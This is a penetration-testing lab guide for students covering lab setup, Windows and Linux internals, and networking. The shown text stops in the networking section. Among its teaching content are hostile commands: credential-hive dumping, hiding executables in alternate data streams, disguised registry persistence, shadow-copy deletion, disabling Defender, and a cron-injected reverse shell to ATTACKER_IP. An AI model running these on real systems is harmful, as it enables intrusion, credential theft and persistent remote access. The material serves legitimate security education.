# Offensive Security Pathway — Comprehensive Lab Guide

## https://www.youtube.com/watch?v=oWV-aaxUq88

### For University Cybersecurity Students & Software Engineers

> **Legal Disclaimer:** All techniques documented here are for educational purposes only. Practice exclusively on systems you own, systems you have explicit written permission to test, or intentionally vulnerable lab machines (Metasploitable, DVWA, your own web apps). Unauthorized access is illegal under laws including the CFAA (USA), Computer Misuse Act (UK), and equivalent laws worldwide.

---

## Table of Contents

1. [Lab Environment Setup](#1-lab-environment-setup)
2. [Foundations — How Computers Work](#2-foundations--how-computers-work)
3. [Operating Systems Deep Dive](#3-operating-systems-deep-dive)
   - [Windows Medium Knowledge](#31-windows-medium-knowledge)
   - [Linux Medium Knowledge](#32-linux-medium-knowledge)
4. [Networking Fundamentals & Medium Knowledge](#4-networking-fundamentals--medium-knowledge)
5. [Cryptography](#5-cryptography)
6. [Scripting & Automation](#6-scripting--automation)
7. [Virtualization & Cloud](#7-virtualization--cloud)
8. [OSINT Techniques](#8-osint-techniques)
9. [Social Engineering](#9-social-engineering)
10. [Reconnaissance Phase](#10-reconnaissance-phase)
11. [Scanning & Enumeration](#11-scanning--enumeration)
12. [Exploitation Fundamentals](#12-exploitation-fundamentals)
13. [Web Application Hacking](#13-web-application-hacking)
14. [Post-Exploitation](#14-post-exploitation)
15. [Privilege Escalation](#15-privilege-escalation)
16. [Persistence Mechanisms](#16-persistence-mechanisms)
17. [Lateral Movement](#17-lateral-movement)
18. [Active Directory Attacks](#18-active-directory-attacks)
19. [Password Attacks](#19-password-attacks)
20. [Malware & Payload Development Concepts](#20-malware--payload-development-concepts)
21. [Antivirus Evasion Concepts](#21-antivirus-evasion-concepts)
22. [Wireless Security](#22-wireless-security)
23. [Practical Labs — Your Own Web Apps](#23-practical-labs--your-own-web-apps)
24. [Practical Labs — Metasploitable 2](#24-practical-labs--metasploitable-2)
25. [Reporting & Documentation](#25-reporting--documentation)
26. [Certifications Roadmap](#26-certifications-roadmap)
27. [Quick Reference Cheat Sheets](#27-quick-reference-cheat-sheets)

---

## 1. Lab Environment Setup

### 1.1 Hardware Requirements

| Component | Minimum                       | Recommended                   |
| --------- | ----------------------------- | ----------------------------- |
| RAM       | 16 GB                         | 32 GB                         |
| CPU Cores | 8                             | 12–16                         |
| Storage   | 100 GB SSD                    | 500 GB NVMe SSD               |
| OS (Host) | Windows 10 Pro / Ubuntu 22.04 | Windows 11 Pro / Ubuntu 22.04 |

### 1.2 Hypervisor Setup (VirtualBox)

```bash
# Download VirtualBox from https://virtualbox.org
# Install with default settings

# Create internal networks in VirtualBox:
# Tools > Network > Host-only Networks

# Network Segments to Create:
# External:  172.16.10.0/24
# DMZ:       172.16.100.0/24
# Internal:  172.16.200.0/24
```

### 1.3 Lab Machines Overview

```
┌─────────────────────────────────────────────────────────────┐
│                    YOUR LAB TOPOLOGY                         │
│                                                              │
│  EXTERNAL ZONE (172.16.10.0/24)                             │
│  ┌─────────────┐    ┌──────────────┐                        │
│  │ Kali Linux  │    │  Commando VM │                        │
│  │ .10.10      │    │  .10.20      │                        │
│  └─────────────┘    └──────────────┘                        │
│                                                              │
│  DMZ ZONE (172.16.100.0/24)                                 │
│  ┌─────────────┐    ┌──────────────┐    ┌──────────────┐   │
│  │ Metasploita │    │  bWAPP       │    │  pfSense     │   │
│  │ ble 3 .50   │    │  vuln web    │    │  Firewall    │   │
│  └─────────────┘    └──────────────┘    └──────────────┘   │
│                                                              │
│  INTERNAL ZONE (172.16.200.0/24)                            │
│  ┌─────────────┐    ┌──────────────┐    ┌──────────────┐   │
│  │ DC01        │    │  SRV01       │    │  Client01    │   │
│  │ AD/DNS .201 │    │  IIS/SQL.202 │    │  Win10 .210  │   │
│  └─────────────┘    └──────────────┘    └──────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

### 1.4 Virtual Machines to Download

| Machine                    | Purpose                   | Download Source          |
| -------------------------- | ------------------------- | ------------------------ |
| Kali Linux                 | Primary attack platform   | kali.org/get-kali        |
| Metasploitable 2           | Vulnerable Linux target   | rapid7.com               |
| Metasploitable 3           | Vulnerable Windows target | GitHub/rapid7            |
| Windows 10 (eval)          | Client target             | microsoft.com/evalcenter |
| Windows Server 2019 (eval) | Server target             | microsoft.com/evalcenter |
| Ubuntu 22.04               | Web server (bWAPP)        | ubuntu.com               |
| pfSense                    | Firewall practice         | pfsense.org              |

### 1.5 Essential Tools Installation on Kali

```bash
# Update all repositories and packages
sudo apt update && sudo apt upgrade -y

# Metasploit Framework (pre-installed on Kali)
msfconsole --version

# Nmap (pre-installed)
nmap --version

# Burp Suite Community (pre-installed)
burpsuite &

# Install additional tools
sudo apt install -y \
  gobuster \
  ffuf \
  sqlmap \
  nikto \
  enum4linux \
  smbclient \
  hydra \
  john \
  hashcat \
  responder \
  impacket-scripts \
  bloodhound \
  neo4j \
  crackmapexec \
  evil-winrm \
  netcat-openbsd \
  socat \
  proxychains4 \
  wireshark \
  tcpdump \
  wfuzz \
  dirbuster \
  wordlists

# Install Python tools
pip3 install --break-system-packages \
  pwntools \
  impacket \
  requests \
  beautifulsoup4 \
  scapy

# Install SecLists wordlists
sudo apt install seclists -y
# Or manually:
# git clone https://github.com/danielmiessler/SecLists /usr/share/seclists
```

### 1.6 Windows Defender Exclusions (Attacker Machine)

```powershell
# Run in PowerShell as Administrator on Commando VM
# Exclude Desktop from Windows Defender
Add-MpPreference -ExclusionPath "$env:USERPROFILE\Desktop"
Add-MpPreference -ExclusionPath "C:\Tools"

# Disable real-time protection (attacker VM only!)
Set-MpPreference -DisableRealtimeMonitoring $true

# Disable Windows Firewall (attacker VM only!)
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

---

## 2. Foundations — How Computers Work

### 2.1 Core Hardware Components

Understanding hardware is essential for hardware-level attacks and understanding system internals.

| Component   | Function                           | Hacking Relevance                                            |
| ----------- | ---------------------------------- | ------------------------------------------------------------ |
| CPU         | Executes instructions              | Architecture matters for shellcode (x86 vs x64 vs ARM)       |
| RAM         | Temporary storage during execution | Memory forensics, credential dumping from RAM                |
| HDD/SSD     | Persistent storage                 | File system forensics, data recovery, alternate data streams |
| NIC         | Network communication              | Packet sniffing, MAC spoofing                                |
| GPU         | Graphics/parallel compute          | Password cracking (hashcat uses GPU)                         |
| BIOS/UEFI   | Firmware, boot management          | UEFI rootkits, secure boot bypass                            |
| Motherboard | Connects all components            | Hardware implants (advanced)                                 |

### 2.2 BIOS vs UEFI — Security Implications

```
BIOS (Legacy)                    UEFI (Modern)
─────────────────────            ─────────────────────
16-bit mode                      32/64-bit mode
Max 2.1TB disk support           Supports >2TB disks
Text-based interface             GUI with mouse support
No Secure Boot                   Secure Boot available
Vulnerable to bootkits           More resilient (with Secure Boot)
MBR partition scheme             GPT partition scheme

Attack Surface:
- BIOS password bypass (remove CMOS battery)
- UEFI rootkits (rare, advanced - e.g., LoJax)
- Secure Boot bypass via vulnerable bootloaders
- Cold boot attacks on RAM
```

### 2.3 The Boot Process (Security Perspective)

```
Power ON
   │
   ▼
BIOS/UEFI POST
   │  ← UEFI Secure Boot checks bootloader signature
   ▼
Bootloader (GRUB / Windows Boot Manager)
   │  ← Rootkits can intercept here (MBR rootkits)
   ▼
Kernel loads
   │  ← Kernel rootkits operate here
   ▼
Init system (systemd / Windows Session Manager)
   │  ← Malware persistence via startup services
   ▼
User space / Login screen
   │  ← Credential harvesting
   ▼
User session
```

### 2.4 File Systems — Security Perspective

```bash
# NTFS (Windows) — Key security features
# - File permissions (ACLs)
# - Alternate Data Streams (ADS) — can hide malware
# - Volume Shadow Copies — forensic goldmine / attacker target
# - Journaling — logs file operations
# - EFS (Encrypted File System)

# ext4 (Linux) — Key security features
# - rwx permissions per user/group/other
# - Setuid/Setgid bits
# - Sticky bit
# - Extended attributes (xattr)
# - Journaling

# Practical: Check file system type
# Linux:
df -T
lsblk -f
cat /proc/mounts

# Windows (PowerShell):
Get-Volume | Select-Object DriveLetter, FileSystem, FileSystemLabel
```

### 2.5 Alternate Data Streams (ADS) — Practical Lab

```cmd
# Windows CMD — ADS Lab
# Navigate to Desktop
cd %USERPROFILE%\Desktop

# Create a normal text file
echo Normal content > visible.txt

# Hide data in an ADS
echo This is hidden malware payload > visible.txt:hidden_stream

# View the normal file — looks empty to casual inspection
type visible.txt

# Read the hidden stream
more < visible.txt:hidden_stream

# List ALL streams (reveals hidden data)
dir /r visible.txt

# PowerShell — more powerful ADS enumeration
Get-Item visible.txt -Stream *
Get-Content visible.txt -Stream hidden_stream

# Hide an executable in ADS (malware technique)
# type C:\Windows\System32\calc.exe > document.pdf:calc_hidden.exe

# Execute from ADS (Windows 10+)
# wmic process call create "C:\path\document.pdf:calc_hidden.exe"

# Detect ADS with Sysinternals Streams
# streams.exe -s C:\Users\user\Desktop\
```

---

## 3. Operating Systems Deep Dive

### 3.1 Windows Medium Knowledge

#### 3.1.1 Windows Architecture

```
┌────────────────────────────────────────────────┐
│              USER MODE                          │
│                                                 │
│  ┌──────────┐ ┌──────────┐ ┌──────────────┐   │
│  │   User   │ │ Service  │ │   System     │   │
│  │   Apps   │ │Processes │ │  Processes   │   │
│  └────┬─────┘ └────┬─────┘ └──────┬───────┘   │
│       │             │              │            │
│  ┌────▼─────────────▼──────────────▼───────┐   │
│  │          Windows API (Win32/WinRT)       │   │
│  │     kernel32.dll  user32.dll  ntdll.dll  │   │
│  └───────────────────────────────┬──────────┘   │
│                                  │              │
├──────────────────────────────────│──────────────┤
│              KERNEL MODE         │              │
│                                  ▼              │
│  ┌────────────────────────────────────────┐    │
│  │     NT Kernel (ntoskrnl.exe)           │    │
│  │  Process Mgr │ Memory Mgr │ I/O Mgr   │    │
│  └───────────────┬────────────────────────┘    │
│                  │                              │
│  ┌───────────────▼────────────────────────┐    │
│  │    Hardware Abstraction Layer (HAL)     │    │
│  └────────────────────────────────────────┘    │
│                                                 │
└────────────────────────────────────────────────┘
                    │
            ┌───────▼──────┐
            │   HARDWARE   │
            └──────────────┘
```

#### 3.1.2 Windows Security Components — Deep Dive

**Local Security Authority (LSA) & LSASS**

```
LSA/LSASS is one of the most targeted processes in Windows hacking.
It stores:
- NTLM password hashes
- Kerberos tickets
- Clear-text credentials (in older configs)
- Cached domain credentials

Common attacks against LSASS:
1. Mimikatz — dumps credentials from LSASS memory
2. ProcDump — legitimate tool abused to dump LSASS
3. Task Manager — can create LSASS dump (manual method)
4. Shadow Copy attacks — access SAM/SYSTEM offline
```

```powershell
# Check if LSASS is running (target enumeration)
Get-Process lsass

# Check LSASS protection level
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" | Select-Object RunAsPPL

# If RunAsPPL = 1, LSASS is protected (PPL - Protected Process Light)
# Requires kernel-level exploit or driver to bypass

# View LSASS memory protection status
Get-WinEvent -FilterHashtable @{
    LogName='Security'
    Id=4690
} | Select-Object -First 10
```

**Security Account Manager (SAM) Database**

```
Location: C:\Windows\System32\config\SAM
          HKLM\SAM (registry)

Contents:
- NTLM hashes of all local user passwords
- Account information
- Group membership

The SAM file is locked while Windows is running.

Methods to access SAM offline:
1. Boot from live USB/CD
2. Volume Shadow Copies
3. Registry export (SYSTEM + SAM hives)

# Extract SAM using reg save (requires SYSTEM privileges):
reg save HKLM\SAM C:\temp\SAM.hiv
reg save HKLM\SYSTEM C:\temp\SYSTEM.hiv
reg save HKLM\SECURITY C:\temp\SECURITY.hiv

# Then use secretsdump.py (impacket) offline:
# secretsdump.py -sam SAM.hiv -system SYSTEM.hiv -security SECURITY.hiv LOCAL
```

**Security Identifiers (SIDs)**

```
SID Format: S-R-X-Y1-Y2-Yn-RID

Example: S-1-5-21-3623811015-3361044348-30300820-1013

S    = SID indicator
1    = Revision (always 1)
5    = NT Authority (identifier authority)
21-xxxxx = Domain identifier (unique per domain/machine)
1013 = RID (Relative ID — identifies specific user/group)

Well-Known RIDs:
500 = Administrator
501 = Guest
512 = Domain Admins group
513 = Domain Users group
514 = Domain Guests group
519 = Enterprise Admins group
544 = Local Administrators group (S-1-5-32-544)
```

```powershell
# Enumerate SIDs
whoami /all
# Shows current user SID, group SIDs, and privileges

# Get SID of specific user
Get-LocalUser | Select-Object Name, SID

# Translate SID to name
$SID = "S-1-5-21-xxxxxxxxxx-500"
$ntAccount = (New-Object System.Security.Principal.SecurityIdentifier($SID)).Translate([System.Security.Principal.NTAccount])
$ntAccount.Value

# PowerShell — Get all users and SIDs
Get-LocalUser | ForEach-Object {
    $user = $_
    $sid = $user.SID
    [PSCustomObject]@{
        Name = $user.Name
        SID = $sid
        Enabled = $user.Enabled
    }
}
```

#### 3.1.3 Windows Registry — Security & Hacking

```
Key Registry Locations for Hackers:

1. Persistence locations (autorun):
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

2. Stored credentials:
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
(Autologon credentials sometimes stored here in plaintext)

3. LSA secrets:
HKLM\SECURITY\Policy\Secrets
(Service account passwords, cached domain credentials)

4. SAM database:
HKLM\SAM

5. Recently accessed files:
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs

6. Typed URLs (browser history in IE):
HKCU\SOFTWARE\Microsoft\Internet Explorer\TypedURLs

7. Installed software enumeration:
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall
```

```cmd
:: Query registry for autorun entries (enumeration)
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

:: Add persistence via registry (lab only)
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "WindowsUpdate" /t REG_SZ /d "C:\Users\user\Desktop\payload.exe" /f

:: Delete registry key
reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "WindowsUpdate" /f

:: Export registry hive for offline analysis
reg export HKLM\SOFTWARE C:\temp\software_hive.reg
```

#### 3.1.4 Windows Processes & Threads — Security

```
Key Processes to Know:

System Processes (should always be running):
- System (PID 4)
- smss.exe — Session Manager
- csrss.exe — Client/Server Runtime
- wininit.exe — Windows Initialization
- winlogon.exe — Windows Logon
- services.exe — Service Control Manager
- lsass.exe — Local Security Authority ← HIGH VALUE TARGET
- svchost.exe — Service Host (multiple instances normal)

Red Flags (malware indicators):
- lsass.exe outside C:\Windows\System32\
- Multiple csrss.exe instances
- svchost.exe with unusual parent process
- explorer.exe spawning cmd.exe or powershell.exe
- Any process running from Temp directories
```

```powershell
# Process investigation commands
# List all processes with details
Get-Process | Format-Table -Property Id, ProcessName, CPU, WorkingSet, Path -AutoSize

# Find processes without file path (suspicious)
Get-Process | Where-Object {$_.Path -eq $null} | Select-Object Id, ProcessName

# Check parent-child relationships
Get-WmiObject Win32_Process | Select-Object ProcessId, ParentProcessId, Name, CommandLine | Sort-Object ProcessId

# Find processes injected into (no backing file)
# Requires SysInternals Process Explorer for GUI
# Or use this PS snippet:
Get-Process | ForEach-Object {
    try {
        $path = $_.MainModule.FileName
        if (-not (Test-Path $path)) {
            Write-Warning "Suspicious: $($_.Name) (PID $($_.Id)) - Path not found: $path"
        }
    } catch {}
}

# Check for LSASS protection
$lsass = Get-Process lsass
Write-Output "LSASS PID: $($lsass.Id)"
```

#### 3.1.5 Windows Privileges & UAC

```
Important Windows Privileges:

SeDebugPrivilege        — Read/write memory of other processes (CRITICAL)
SeImpersonatePrivilege  — Impersonate clients (potato attacks)
SeAssignPrimaryToken    — Replace process token
SeLoadDriver            — Load kernel drivers
SeTakeOwnership         — Take ownership of objects
SeBackupPrivilege       — Read any file (bypass ACLs)
SeRestorePrivilege      — Write any file
SeCreateSymbolicLink    — Create symlinks (for file permission bypasses)
SeShutdownPrivilege     — Shut down system
SeChangeNotifyPrivilege — Bypass traverse checking (normal users have this)
```

```cmd
:: Check current privileges
whoami /priv

:: Check if running as admin
net session >nul 2>&1 && echo "Admin" || echo "Not Admin"

:: UAC bypass check (lab)
:: If SeImpersonatePrivilege is available → try Potato attacks
:: If SeDebugPrivilege → Mimikatz/credential dumping possible
```

```powershell
# Check for high-value privileges
$privs = @(
    "SeDebugPrivilege",
    "SeImpersonatePrivilege",
    "SeAssignPrimaryTokenPrivilege",
    "SeLoadDriverPrivilege",
    "SeTakeOwnershipPrivilege",
    "SeBackupPrivilege"
)

$currentPrivs = whoami /priv
foreach ($priv in $privs) {
    if ($currentPrivs -match $priv) {
        Write-Host "[!] HIGH VALUE PRIVILEGE FOUND: $priv" -ForegroundColor Red
    }
}
```

#### 3.1.6 Remote Desktop Protocol (RDP) — Hacking Perspective

```
RDP Default Port: 3389
Protocol: TP/RDP over TCP

Attacks:
1. BlueKeep (CVE-2019-0708) — Pre-auth RCE (patched)
2. DejaBlue (CVE-2019-1181/1182) — Pre-auth RCE (patched)
3. Credential brute force
4. Pass-the-Hash with restricted admin mode
5. RDP session hijacking (if running as SYSTEM)
6. Man-in-the-Middle (SSL stripping on older configs)
```

```powershell
# Enable RDP
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# Check if RDP is enabled
Get-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' | Select-Object fDenyTSConnections

# List active RDP sessions
query session
# or
qwinsta

# Disconnect a session
rwinsta /server:localhost 2

# Enable Network Level Authentication (NLA)
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -value 1

# Check RDP port
netstat -ano | findstr :3389
```

#### 3.1.7 Volume Shadow Copies — Attacker & Defender Perspective

```bash
# Volume Shadow Copies are a goldmine for:
# 1. Accessing locked files (SAM, NTDS.dit)
# 2. Recovering deleted evidence
# 3. Bypassing ransomware (attackers delete them first)

# Create a shadow copy (PowerShell)
$s = (Get-WmiObject -List Win32_ShadowCopy).Create("C:\", "ClientAccessible")
$shadow = Get-WmiObject Win32_ShadowCopy | Sort-Object InstallDate -Descending | Select-Object -First 1
Write-Output $shadow.DeviceObject

# Access files via shadow copy
# cmd.exe /c mklink /d C:\ShadowCopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
# Then browse C:\ShadowCopy\ to access old/locked files

# VSSAdmin commands
vssadmin list shadows              # List all shadow copies
vssadmin create shadow /for=C:    # Create shadow copy
vssadmin delete shadows /all /quiet # Delete all (ransomware technique!)

# WMIC shadow copy access (copy SAM for offline cracking)
# wmic shadowcopy call create Volume="C:\"
```

---

### 3.2 Linux Medium Knowledge

#### 3.2.1 Linux Directory Structure — Security Perspective

```
/                     Root — the top
├── bin/              Essential user binaries (ls, cp, cat)
├── sbin/             System admin binaries (iptables, fdisk)
├── boot/             Bootloader files — GRUB config here
├── dev/              Device files (everything is a file!)
│   ├── sda           Hard disk
│   ├── null          Bit bucket (discard output)
│   ├── zero          Source of null bytes
│   └── urandom       Cryptographic random source
├── etc/              ← GOLD MINE FOR ATTACKERS
│   ├── passwd        User accounts (world-readable)
│   ├── shadow        Password hashes (root only!)
│   ├── sudoers       Sudo permissions
│   ├── hosts         Static DNS
│   ├── crontab       Scheduled tasks
│   ├── ssh/          SSH configuration
│   │   └── sshd_config
│   ├── apache2/      Web server config
│   └── nginx/        Web server config
├── home/             User home directories
│   └── username/
│       ├── .bash_history   ← Command history (credentials!)
│       ├── .ssh/           ← SSH keys!
│       │   ├── id_rsa      Private key
│       │   ├── id_rsa.pub  Public key
│       │   └── authorized_keys
│       ├── .bashrc
│       └── .bash_profile
├── proc/             Process information (pseudo filesystem)
│   ├── /proc/[PID]/cmdline  Command that started process
│   ├── /proc/[PID]/environ  Environment variables
│   └── /proc/net/tcp        Network connections
├── root/             Root user home directory
├── tmp/              Temporary files (world-writable!)
├── usr/
│   └── local/        Locally installed software
├── var/
│   ├── log/          ← Log files (clear tracks here)
│   │   ├── auth.log        Authentication logs
│   │   ├── syslog          System logs
│   │   └── apache2/        Web server logs
│   └── www/          Web root (Apache)
└── opt/              Optional software
```

#### 3.2.2 Linux File Permissions — Complete Guide

```bash
# Permission string breakdown:
# -rwxr-xr-x  1  user  group  4096  Jan 1  file.txt
# │││││││││
# │││││││└── Other execute
# ││││││└─── Other write
# │││││└──── Other read
# ││││└───── Group execute
# │││└────── Group write
# ││└─────── Group read
# │└──────── Owner execute
# └───────── Owner write
#            Owner read
# (first char: - file, d dir, l symlink, b block device)

# Numerical permission calculation:
# Read    = 4
# Write   = 2
# Execute = 1

# Common permission sets:
# 777 = rwxrwxrwx = Full control everyone (DANGEROUS)
# 755 = rwxr-xr-x = Owner full, others read+execute
# 644 = rw-r--r-- = Owner read+write, others read only
# 600 = rw------- = Owner only (SSH private keys should be this)
# 400 = r-------- = Read-only by owner
# 000 = ---------- = No access anyone

# Check permissions
ls -la /etc/shadow
ls -la ~/.ssh/id_rsa

# Change permissions
chmod 755 script.sh          # Symbolic
chmod u+x,g-w,o-r file.txt  # Operator style
chmod 600 ~/.ssh/id_rsa      # SSH key must be 600

# Change ownership
chown user:group file.txt
chown -R www-data:www-data /var/www/html/

# Find world-writable files (security audit)
find / -perm -002 -type f 2>/dev/null

# Find SUID binaries (privilege escalation goldmine!)
find / -perm -4000 -type f 2>/dev/null

# Find SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Find files owned by root with SUID
find / -user root -perm -4000 -type f 2>/dev/null
```

**Special Permission Bits — Critical for Privilege Escalation**

```bash
# SUID (Set User ID) — runs as file OWNER not current user
# Example: /usr/bin/passwd is SUID root
# Anyone can run it, but it runs as root to change /etc/shadow
ls -la /usr/bin/passwd
# -rwsr-xr-x  1  root  root  passwd
#    ^^ 's' in owner execute position = SUID

# SGID (Set Group ID) — runs as file GROUP
ls -la /usr/bin/write
# -rwxr-sr-x = SGID

# Sticky Bit — only owner can delete (used on /tmp)
ls -la /tmp
# drwxrwxrwt = sticky bit (t at end)

# Setting special bits
chmod u+s binary    # Set SUID
chmod g+s directory  # Set SGID
chmod +t directory   # Set sticky bit
chmod 4755 binary   # SUID numerically (4 prefix)
chmod 2755 directory # SGID numerically (2 prefix)
chmod 1777 /tmp     # Sticky bit numerically (1 prefix)

# CRITICAL SECURITY CHECK:
# If a SUID binary is writable — instant root!
find / -perm -4000 -writable 2>/dev/null
```

#### 3.2.3 Linux Users, Groups & Sudo

```bash
# /etc/passwd format:
# username:x:UID:GID:comment:home:shell
# root:x:0:0:root:/root:/bin/bash
# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

# x means password is in /etc/shadow
# UID 0 = root (any account with UID 0 is root!)
# Shell /usr/sbin/nologin or /bin/false = no interactive login

# /etc/shadow format:
# username:$hash_type$salt$hash:last_change:min:max:warn:inactive:expire
# Hash types:
# $1$ = MD5 (weak, crackable)
# $2a$ or $2y$ = bcrypt (strong)
# $5$ = SHA-256
# $6$ = SHA-512 (most common on modern Linux)

# View /etc/passwd (any user can read)
cat /etc/passwd

# View /etc/shadow (root only)
sudo cat /etc/shadow

# Add user
sudo useradd -m -s /bin/bash -G sudo newuser
sudo passwd newuser

# Check group membership
id
groups username
cat /etc/group | grep username

# /etc/sudoers format:
# user  ALL=(ALL:ALL) ALL
# user  host=(run_as_user:run_as_group) commands
# %group  ALL=(ALL) NOPASSWD: /bin/systemctl restart apache2

# Check sudo permissions
sudo -l
# Lists what current user can run with sudo

# Run command as another user
sudo -u www-data id
sudo -u root /bin/bash  # If permitted
```

#### 3.2.4 Linux Networking Commands

```bash
# Network Interface Information
ip a                    # Show all interfaces (modern)
ip addr show eth0       # Specific interface
ifconfig                # Legacy (may need installation)
ip link show            # Layer 2 info

# Routing Table
ip route show
route -n                # Legacy
netstat -r              # Legacy

# Active Connections
ss -tulpn               # Modern: TCP/UDP listening/established with PID
netstat -tulpn          # Legacy equivalent
netstat -antp           # All TCP connections with PIDs

# DNS
cat /etc/resolv.conf    # DNS servers
cat /etc/hosts          # Static host entries
nslookup google.com     # DNS lookup
dig google.com A        # Detailed DNS query
dig google.com MX       # Mail records
dig @8.8.8.8 google.com # Query specific DNS server

# Firewall (iptables)
sudo iptables -L -v -n              # List all rules
sudo iptables -L INPUT -v -n        # Input chain
sudo iptables -A INPUT -p tcp --dport 4444 -j ACCEPT  # Allow port
sudo iptables -F                     # Flush all rules (dangerous!)

# UFW (Ubuntu Firewall — simpler interface)
sudo ufw status verbose
sudo ufw allow 22/tcp
sudo ufw deny 80/tcp
sudo ufw enable

# Test connectivity
ping -c 4 8.8.8.8        # 4 pings to Google DNS
traceroute google.com     # Trace route
curl -I https://target.com # HTTP headers only
wget -q -O - http://target.com | head  # Fetch webpage

# Network scanning from target machine (post-exploitation)
ip a                      # What networks am I on?
ip route                  # Can I reach other networks?
cat /etc/hosts            # What hostnames are configured?
arp -a                    # Who have I talked to recently?
ss -tulpn                 # What services are running?
```

#### 3.2.5 Linux Processes & Service Management

```bash
# Process Management
ps aux                   # All processes, user-oriented
ps -ef                   # All processes, full format
ps aux | grep apache     # Find specific process
pgrep -l apache          # Find PIDs by name
top                      # Interactive process viewer
htop                     # Enhanced process viewer

# Process details
ls -la /proc/$(pgrep apache2 | head -1)/
cat /proc/$(pgrep apache2 | head -1)/cmdline | tr '\0' ' '  # Command
cat /proc/$(pgrep apache2 | head -1)/environ | tr '\0' '\n'  # Environment
ls -la /proc/$(pgrep apache2 | head -1)/fd/                  # Open files

# Kill processes
kill PID                 # Graceful termination (SIGTERM)
kill -9 PID             # Force kill (SIGKILL)
killall apache2          # Kill by name
pkill -9 -f "python3"   # Kill by pattern, force

# Service management (systemd)
systemctl list-units --type=service --state=running
systemctl status ssh
sudo systemctl start ssh
sudo systemctl stop ssh
sudo systemctl restart ssh
sudo systemctl enable ssh    # Start at boot
sudo systemctl disable ssh   # Don't start at boot

# Check all enabled services at boot
systemctl list-unit-files --state=enabled

# Legacy SysV init
service --status-all
service ssh start
service ssh stop
```

#### 3.2.6 Cron Jobs — Privilege Escalation Vector

```bash
# Cron jobs are scheduled tasks in Linux
# They're a major privilege escalation vector

# View cron jobs
crontab -l                  # Current user's crons
sudo crontab -u root -l     # Root's crons
cat /etc/crontab            # System-wide crons
ls -la /etc/cron.d/         # Cron.d directory
ls -la /etc/cron.daily/     # Daily crons
ls -la /etc/cron.weekly/    # Weekly crons
ls -la /etc/cron.monthly/   # Monthly crons

# Check for writable cron scripts (privesc!)
# If root runs a script, and you can write to it...
cat /etc/crontab | grep -v "^#"
for script in $(cat /etc/crontab | awk '{print $7}' | grep "/" 2>/dev/null); do
    ls -la $script 2>/dev/null
done

# Cron format:
# * * * * * command
# │ │ │ │ │
# │ │ │ │ └── Day of week (0-7, Sunday=0 or 7)
# │ │ │ └──── Month (1-12)
# │ │ └────── Day of month (1-31)
# │ └──────── Hour (0-23)
# └────────── Minute (0-59)

# Add a cron job (current user)
crontab -e
# Add line: */5 * * * * /home/user/script.sh

# Common privesc: writable script run by root
# echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /path/to/root_cron_script.sh
```

---

## 4. Networking Fundamentals & Medium Knowledge

### 4.1 OSI Model — Hacker's Perspective

```
Layer 7 — Application    HTTP, HTTPS, FTP, SSH, DNS, SMTP
Layer 6 — Presentation   SSL/TLS encryption, data encoding
Layer 5 — Session        NetBIOS, RPC, SQL sessions
Layer 4 — Transport      TCP (reliable), UDP (fast)
Layer 3 — Network        IP, ICMP, routing
Layer 2 — Data Link      Ethernet, ARP, MAC addresses
Layer 1 — Physical       Cables, WiFi signals, fiber

Attack mapping by OSI layer:
L7: Web attacks (SQLi, XSS), phishing, SMTP spoofing
L6: SSL stripping, downgrade attacks
L5: Session hijacking
L4: Port scanning, TCP SYN flood, UDP flood
L3: IP spoofing, ICMP flood (ping flood), routing attacks
L2: ARP spoofing/poisoning, MAC flooding, VLAN hopping
L1: Physical access, cable tapping, rogue AP
```

### 4.2 TCP/IP — Deep Dive for Hackers

```
TCP Three-Way Handshake:

Client          Server
  │── SYN ────►  │  (I want to connect, seq=x)
  │◄─ SYN/ACK ── │  (OK, seq=y, ack=x+1)
  │── ACK ────►  │  (Connected, ack=y+1)
  │              │
  │═══ DATA ════►│  (Communication happens)
  │              │
  │── FIN ────►  │  (I'm done)
  │◄─ FIN/ACK ── │  (OK, closing)
  │── ACK ────►  │  (Acknowledged)

SYN Scan (Nmap -sS):
Client          Server
  │── SYN ────►  │  (Port open? seq=x)
  │◄─ SYN/ACK ── │  (Port is OPEN)
  │── RST ────►  │  (Never complete handshake = stealth)

UDP "Scan":
Client          Server
  │── UDP ────►  │  (Port open?)
  │              │  (No response = open OR filtered)
  │◄─ ICMP Port ─│  (ICMP Port Unreachable = CLOSED)
      Unreachable

TCP Flags:
SYN - Synchronize (initiate connection)
ACK - Acknowledge
FIN - Finish (graceful close)
RST - Reset (abrupt close, also used to detect open ports)
PSH - Push (send data immediately)
URG - Urgent
```

```python
# Python — TCP banner grabbing
import socket

def grab_banner(ip, port):
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect((ip, port))
        banner = s.recv(1024).decode().strip()
        print(f"[+] {ip}:{port} - {banner}")
        s.close()
        return banner
    except Exception as e:
        print(f"[-] {ip}:{port} - {e}")
        return None

# Test against your lab machines
grab_banner("172.16.100.50", 21)   # FTP banner
grab_banner("172.16.100.50", 22)   # SSH banner
grab_banner("172.16.100.50", 80)   # HTTP banner
```

